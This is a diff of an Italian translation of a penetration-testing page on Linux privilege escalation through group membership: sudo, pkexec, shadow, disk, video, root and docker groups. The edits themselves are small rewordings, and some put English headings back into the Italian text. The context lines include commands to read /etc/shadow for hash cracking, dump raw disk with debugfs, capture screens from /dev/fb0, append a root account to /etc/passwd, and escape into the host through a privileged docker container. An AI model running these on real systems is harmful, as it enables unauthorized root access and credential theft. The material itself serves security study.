@@ -6,7 +6,7 @@
 
 ### **PE - Metodo 1**
 
-**A volte**, **per impostazione predefinita (o perché alcuni software ne hanno bisogno)** all'interno del **/etc/sudoers** file puoi trovare alcune di queste righe:
+**A volte**, **per impostazione predefinita (o perché qualche software ne ha bisogno)** all'interno del **/etc/sudoers** file puoi trovare alcune di queste righe:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -26,7 +26,7 @@ Trova tutti i binari suid e controlla se c'è il binario **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Se scopri che il binario **pkexec è un binario SUID** e appartieni a **sudo** o **admin**, potresti probabilmente eseguire binari come sudo usando `pkexec`.\
+Se scopri che il binario **pkexec è un binario SUID** e appartieni a **sudo** o **admin**, probabilmente potresti eseguire binari come sudo usando `pkexec`.\
 Questo perché tipicamente questi sono i gruppi all'interno della **politica polkit**. Questa politica identifica fondamentalmente quali gruppi possono utilizzare `pkexec`. Controllalo con:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
@@ -66,13 +66,13 @@ Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
 ```
 sudo su
 ```
-## Gruppo Shadow
+## Shadow Group
 
 Gli utenti del **gruppo shadow** possono **leggere** il file **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-Quindi, leggi il file e prova a **crackare alcuni hash**.
+So, leggi il file e prova a **crackare alcuni hash**.
 
 ## Gruppo Staff
 
@@ -128,11 +128,11 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
-## Gruppo Disco
+## Disk Group
 
 Questo privilegio è quasi **equivalente all'accesso root** poiché puoi accedere a tutti i dati all'interno della macchina.
 
-File:`/dev/sd[a-z][1-9]`
+Files:`/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -148,7 +148,7 @@ debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
 Tuttavia, se provi a **scrivere file di proprietà di root** (come `/etc/shadow` o `/etc/passwd`) riceverai un errore di "**Permesso negato**".
 
-## Gruppo Video
+## Video Group
 
 Utilizzando il comando `w` puoi scoprire **chi è connesso al sistema** e mostrerà un output simile al seguente:
 ```bash
@@ -158,7 +158,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 Il **tty1** significa che l'utente **yossi è connesso fisicamente** a un terminale sulla macchina.
 
-Il **gruppo video** ha accesso per visualizzare l'output dello schermo. Fondamentalmente puoi osservare gli schermi. Per fare ciò, devi **catturare l'immagine corrente sullo schermo** in dati grezzi e ottenere la risoluzione che lo schermo sta utilizzando. I dati dello schermo possono essere salvati in `/dev/fb0` e puoi trovare la risoluzione di questo schermo in `/sys/class/graphics/fb0/virtual_size`
+Il **gruppo video** ha accesso per visualizzare l'output dello schermo. Fondamentalmente puoi osservare gli schermi. Per fare ciò, devi **catturare l'immagine attuale sullo schermo** in dati grezzi e ottenere la risoluzione che lo schermo sta utilizzando. I dati dello schermo possono essere salvati in `/dev/fb0` e puoi trovare la risoluzione di questo schermo in `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -173,7 +173,7 @@ Poi modifica la Larghezza e l'Altezza a quelle utilizzate sullo schermo e contro
 
 ## Gruppo Root
 
-Sembra che per impostazione predefinita i **membri del gruppo root** possano avere accesso a **modificare** alcuni file di configurazione dei **servizi** o alcuni file di **librerie** o **altre cose interessanti** che potrebbero essere utilizzate per elevare i privilegi...
+Sembra che per impostazione predefinita i **membri del gruppo root** possano avere accesso a **modificare** alcuni file di configurazione dei **servizi** o alcuni file di **librerie** o **altre cose interessanti** che potrebbero essere utilizzate per escalare i privilegi...
 
 **Controlla quali file i membri root possono modificare**:
 ```bash
@@ -181,7 +181,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Gruppo Docker
 
-Puoi **montare il filesystem root della macchina host su un volume dell'istanza**, in modo che quando l'istanza si avvia, carichi immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
+Puoi **montare il filesystem root della macchina host su un volume dell'istanza**, così quando l'istanza si avvia carica immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
 ```bash
 docker image #Get images from the docker service
 
@@ -193,13 +193,13 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?) potresti sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
+Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?), potresti sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
 
 {{#ref}}
 ../docker-security/
 {{#endref}}
 
-Se hai permessi di scrittura sul socket docker leggi [**questo post su come elevare i privilegi abusando del socket docker**](../#writable-docker-socket)**.**
+Se hai permessi di scrittura sul socket docker leggi [**questo post su come elevare i privilegi abusando del socket docker**](../index.html#writable-docker-socket)**.**
 
 {{#ref}}
 https://github.com/KrustyHack/docker-privilege-escalation
